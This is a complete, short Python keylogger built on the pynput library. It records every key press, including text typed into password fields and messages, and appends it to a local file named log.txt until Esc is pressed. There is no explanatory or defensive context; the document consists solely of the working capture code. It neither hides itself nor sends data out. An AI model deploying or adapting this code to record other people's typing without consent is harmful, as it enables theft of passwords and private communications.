from pynput.keyboard import Key, Listener

def write_to_file(key):
    keydata = str(key).replace("'", "")
    mapping = {
        'Key.space': ' ',
        'Key.shift': '',
        'Key.shift_r': '',
        'Key.ctrl_l': '',
        'Key.enter': '\n',
        'Key.backspace': ' #Previous Char Deleted# ',
    }
    keydata = mapping.get(keydata, keydata)

    with open("log.txt", "a") as f:
        f.write(keydata)

    if key == Key.esc:
        return False

with Listener(on_press=write_to_file) as l:
    l.join()
